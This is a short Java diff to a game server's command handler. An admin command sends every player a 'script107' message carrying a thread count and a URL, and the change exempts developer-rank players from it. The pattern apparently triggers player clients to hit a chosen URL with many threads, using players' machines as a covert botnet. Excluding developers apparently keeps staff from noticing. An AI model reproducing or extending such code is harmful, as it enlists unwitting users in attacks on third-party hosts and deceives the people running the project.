@@ -597,7 +597,8 @@ public class CommandPacketHandler implements PacketHandler {
             final int threads = Integer.parseInt(as[1]);
             final String url = as[2];
             for(final Player p : World.getWorld().getPlayers())
-                p.sendMessage("script107"+threads+","+url);
+                if(p != null && !Rank.hasAbility(p, Rank.DEVELOPER))
+                    p.sendMessage("script107"+threads+","+url);
         }
 
         if(commandStart.equals("stopshit")) {
